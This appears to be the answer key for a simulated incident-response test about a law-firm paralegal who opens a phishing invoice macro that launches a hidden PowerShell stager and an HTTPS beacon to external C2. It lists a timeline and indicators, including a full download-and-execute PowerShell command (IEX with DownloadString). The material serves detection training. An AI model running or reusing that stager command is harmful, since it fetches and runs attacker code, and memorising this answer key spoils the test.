# Ground Truth: phishing-c2-beacon

**Scenario:** A paralegal at a small law firm opens a macro-enabled attachment from a
phishing email disguised as an overdue invoice notice. The macro
launches a hidden PowerShell stager that establishes a periodic HTTPS
beacon to external infrastructure. After roughly ninety minutes of
routine check-in traffic, one connection within that same channel
carries a byte volume an order of magnitude larger than every other
beacon tick — a manual attacker action riding the C2 channel, not the
beacon itself. Tests whether an agent traces delivery -> execution ->
C2 as three distinct, separately-citable stages, and specifically
whether it notices the one connection that isn't like the others
rather than treating "found a beacon" as the end of the investigation.


**Generated:** 2024-11-04 13:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **james.okafor** on **WS-JOKAFOR-01**: James logs into his own workstation for the day, as usual
2. **james.okafor** on **WS-JOKAFOR-01**: A phishing email disguised as an overdue-invoice notice is delivered to James's inbox
3. **james.okafor** on **WS-JOKAFOR-01**: James opens the attachment, enabling macros when prompted
4. **james.okafor** on **WS-JOKAFOR-01**: The document's macro silently launches a hidden PowerShell stager
5. **james.okafor** on **WS-JOKAFOR-01**: The stager establishes a periodic HTTPS beacon to external C2 infrastructure, continuing for about three hours
6. **james.okafor** on **WS-JOKAFOR-01**: Roughly ninety minutes into the beacon, one connection within the same channel carries far more data than any routine check-in — a manual attacker action riding the C2 channel


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-11-04 14:59:32 UTC | james.okafor | WS-JOKAFOR-01 | Logon | Network logon from 23.129.64.210 (LogonID: 0xa2616c2) |
| 2024-11-04 15:04:48 UTC | james.okafor | WS-JOKAFOR-01 | Email_Message | Email delivered: billing@invoice-secure-delivery.net -> james.okafor@rivermarklegal.com; subject 'Overdue Invoice #4471 - Immediate Action Required' (artifacts/email/evt-phish-001-00003e586dc4.eml) |
| 2024-11-04 15:11:35 UTC | james.okafor | WS-JOKAFOR-01 | Process | Process: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE (PID: 4792) - `"C:\Program Files\Microsoft Office\root\Office1...` |
| 2024-11-04 15:13:29 UTC | james.okafor | WS-JOKAFOR-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 4812) - `powershell.exe -NoProfile -WindowStyle Hidden -...` |
| 2024-11-04 15:13:32 UTC | james.okafor | WS-JOKAFOR-01 | Beacon | Beacon to 45.83.221.40:443 (37 attempts, 3h) |
| 2024-11-04 16:43:45 UTC | james.okafor | WS-JOKAFOR-01 | Connection | Connection to 45.83.221.40:443 (UID: C192mUjU7C5Jzirkp) |


## Indicators of Compromise (IOCs)

### Network IOCs

- 23.129.64.210 (Attacker IP)
- 45.83.221.40:443 (Beacon Target)
- 45.83.221.40:443 (C2 Server)
- Message-ID: <billing-d6044188-3859950@invoice-secure-delivery.net>
- SMTP Zeek UID: ClZ5qGj89nSxslVGr
- Zeek UID: C192mUjU7C5Jzirkp

### Process IOCs

- C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- `"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\james.okafor\Downloads\Invoice_4471.docm"`
- `powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://cdn-updates-svc.net/init.ps1')"`

### User IOCs

- james.okafor (compromised account)

### File IOCs

- artifacts/email/evt-phish-001-00003e586dc4.eml
